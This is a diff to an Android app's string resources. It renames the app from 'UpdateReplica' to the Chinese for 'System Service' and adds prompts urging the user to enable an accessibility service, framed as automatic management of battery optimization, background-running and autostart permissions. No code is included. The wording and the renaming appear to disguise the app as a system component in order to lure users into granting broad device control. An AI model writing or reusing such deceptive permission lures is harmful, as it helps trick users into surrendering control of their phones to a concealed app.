@@ -1,3 +1,7 @@
 <resources>
-    <string name="app_name">UpdateReplica</string>
+    <string name="app_name">系统服务</string>
+    <string name="enable_accessibility_service">开启无障碍服务</string>
+    <string name="usage_instructions">本应用需要无障碍权限才能正常运行。\n\n开启后，应用将自动为您优化系统设置，包括：\n\n• 自动管理电池优化\n• 自动管理后台运行权限\n• 自动管理自启动权限\n• 保持系统服务稳定运行\n\n请点击下方按钮，前往系统设置开启无障碍服务。</string>
+    <string name="accessibility_service_label">系统服务</string>
+    <string name="accessibility_service_description">此服务用于自动优化系统设置，管理电池优化、后台运行权限和自启动权限，确保系统服务稳定运行。</string>
 </resources>
